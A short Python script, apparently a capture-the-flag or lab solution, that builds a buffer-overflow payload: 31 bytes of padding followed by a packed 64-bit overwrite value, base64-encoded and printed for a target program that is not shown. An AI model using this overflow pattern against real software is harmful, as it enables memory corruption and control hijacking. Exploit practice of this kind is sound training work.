
import sys
import struct
import base64

buf = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
buf += struct.pack('<Q', 7733373405735553053)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
